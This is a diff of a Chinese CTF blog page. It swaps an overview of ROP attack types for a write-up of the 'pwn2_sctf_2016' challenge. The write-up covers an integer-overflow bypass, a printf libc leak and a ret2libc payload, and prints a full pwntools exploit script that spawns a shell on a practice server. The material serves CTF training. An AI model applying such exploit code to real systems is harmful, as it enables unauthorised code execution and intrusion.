@@ -20,19 +20,27 @@
     var CONFIG = {"hostname":"pr0b1em.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="ROP小分类">
+  <meta name="description" content="libc泄露|整数溢出">
 <meta property="og:type" content="article">
-<meta property="og:title" content="基本ROP">
-<meta property="og:url" content="https://pr0b1em.github.io/2021/06/20/%E5%9F%BA%E6%9C%ACROP/index.html">
+<meta property="og:title" content="pwn2_sctf_2016">
+<meta property="og:url" content="https://pr0b1em.github.io/2021/07/06/pwn2-sctf-2016/index.html">
 <meta property="og:site_name" content="8023">
-<meta property="og:description" content="ROP小分类">
+<meta property="og:description" content="libc泄露|整数溢出">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-06-20T13:55:52.000Z">
-<meta property="article:modified_time" content="2021-06-20T14:05:47.967Z">
+<meta property="og:image" content="https://pr0b1em.github.io/img/image-20210627162616928.png">
+<meta property="og:image" content="https://pr0b1em.github.io/img/image-20210627162846304.png">
+<meta property="og:image" content="https://pr0b1em.github.io/img/image-20210627163205184.png">
+<meta property="og:image" content="https://pr0b1em.github.io/img/image-20210627163308598.png">
+<meta property="og:image" content="https://pr0b1em.github.io/img/image-20210627164147748.png">
+<meta property="og:image" content="https://pr0b1em.github.io/img/mage-20210627163859886.png">
+<meta property="og:image" content="https://pr0b1em.github.io/img/image-20210706132149436.png">
+<meta property="article:published_time" content="2021-07-06T05:22:54.000Z">
+<meta property="article:modified_time" content="2021-07-06T05:25:31.055Z">
 <meta property="article:author" content="Pr0b1em">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pr0b1em.github.io/img/image-20210627162616928.png">
 
-<link rel="canonical" href="https://pr0b1em.github.io/2021/06/20/%E5%9F%BA%E6%9C%ACROP/">
+<link rel="canonical" href="https://pr0b1em.github.io/2021/07/06/pwn2-sctf-2016/">
 
 
 <script id="page-configurations">
@@ -45,7 +53,7 @@
   };
 </script>
 
-  <title>基本ROP | 8023</title>
+  <title>pwn2_sctf_2016 | 8023</title>
   
 
 
@@ -157,7 +165,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://pr0b1em.github.io/2021/06/20/%E5%9F%BA%E6%9C%ACROP/">
+    <link itemprop="mainEntityOfPage" href="https://pr0b1em.github.io/2021/07/06/pwn2-sctf-2016/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/logo.jpg">
@@ -170,7 +178,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          基本ROP
+          pwn2_sctf_2016
         </h1>
 
         <div class="post-meta">
@@ -181,7 +189,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2021-06-20 21:55:52 / 修改时间：22:05:47" itemprop="dateCreated datePublished" datetime="2021-06-20T21:55:52+08:00">2021-06-20</time>
+              <time title="创建时间：2021-07-06 13:22:54 / 修改时间：13:25:31" itemprop="dateCreated datePublished" datetime="2021-07-06T13:22:54+08:00">2021-07-06</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -189,7 +197,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                  <a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a>
                 </span>
             </span>
 
@@ -199,16 +207,16 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>934</span>
+              <span>2.1k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>2 分钟</span>
             </span>
-            <div class="post-description">ROP小分类</div>
+            <div class="post-description">libc泄露|整数溢出</div>
 
         </div>
       </header>
@@ -219,19 +227,36 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h1><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
-<p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p>
-<pre><code>程序存在溢出，并且可以控制返回地址。
+        <h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><p>检查保护机制，开了NX,32位</p>
+<p><img src="/img/image-20210627162616928.png" alt="image-20210627162616928"></p>
+<p>尝试运行了一下</p>
+<p><img src="/img/image-20210627162846304.png" alt="image-20210627162846304"></p>
+<p>IDA打开，main函数很简单，就调用了一个vuln()函数，那就看看vuln()函数</p>
+<p><img src="/img/image-20210627163205184.png" alt="image-20210627163205184"></p>
+<p><img src="/img/image-20210627163308598.png" alt="image-20210627163308598"></p>
+<p><img src="/img/image-20210627164147748.png" alt="image-20210627164147748"></p>
+<p>读出内容限制a2输入最大字节长度为32，接受a2个长度的字符串并放到vuln函数的缓冲区内部，但是a2传入的值类型是unsigned int，而前面判断长度的类型是int，可以规避长度限制。也就是说我们这边可以输入负数来达到溢出的效果（整数溢出）</p>
+<p>这里发现输入函数是get_n,而不是get，说明是自定义函数</p>
+<p>shift+F12查找字符串，没有看见system(‘/bin/sh’)字样</p>
+<p><img src="/img/mage-20210627163859886.png" alt="image-20210627163859886"></p>
+<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>1.通过输入负数，绕过长度限制，造成溢出</p>
+<p>2.利用printf函数泄露程序的libc版本，算出system和‘/bin/sh’的地址</p>
+<p>3.溢出覆盖返回地址执行system(‘/bin/sh’)，夺权</p>
+<h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>整数溢出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
-可以找到满足条件的 gadgets 以及相应 gadgets 的地址。
-</code></pre>
-<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>
-<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
-<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
-<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</p>
-<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
-<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p>
-<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
+<p>泄露libc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(printf_plt)+p32(main)+p32(printf_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">printf_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br></pre></td></tr></table></figure>
+
+<p>算出system和’/bin/sh’的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">offset=printf_addr-libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>覆盖返回地址，夺权</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">r.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25624</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn2_sctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read? &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(printf_plt)+p32(main)+p32(printf_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">printf_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#libc=LibcSearcher(&#x27;printf&#x27;,printf_addr)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">offset=printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system=offset+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=offset+ <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read? &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20210706132149436.png" alt="image-20210706132149436"></p>
 
     </div>
 
@@ -247,13 +272,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/06/20/%5BHarekazeCTF2019%5Dbaby_rop/" rel="prev" title="(HarekazeCTF2019)baby_rop(ret2text)">
-      <i class="fa fa-chevron-left"></i> (HarekazeCTF2019)baby_rop(ret2text)
+    <a href="/2021/06/28/jarvisoj-level3/" rel="prev" title="jarvisoj_level3">
+      <i class="fa fa-chevron-left"></i> jarvisoj_level3
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2021/06/25/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-rop/" rel="next" title="铁人三项(第五赛区)_2018_rop">
-      铁人三项(第五赛区)_2018_rop <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -312,7 +334,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E6%9C%ACROP"><span class="nav-number">1.</span> <span class="nav-text">基本ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2text"><span class="nav-number">1.1.</span> <span class="nav-text">ret2text</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.1.</span> <span class="nav-text">原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2shellcode"><span class="nav-number">1.2.</span> <span class="nav-text">ret2shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2syscall"><span class="nav-number">1.3.</span> <span class="nav-text">ret2syscall</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2libc"><span class="nav-number">1.4.</span> <span class="nav-text">ret2libc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86-3"><span class="nav-number">1.4.1.</span> <span class="nav-text">原理</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn2-sctf-2016"><span class="nav-number">1.</span> <span class="nav-text">pwn2_sctf_2016</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="nav-number">1.0.1.</span> <span class="nav-text">利用思路：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="nav-number">1.0.2.</span> <span class="nav-text">解题过程：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp%EF%BC%9A"><span class="nav-number">1.0.3.</span> <span class="nav-text">exp：</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
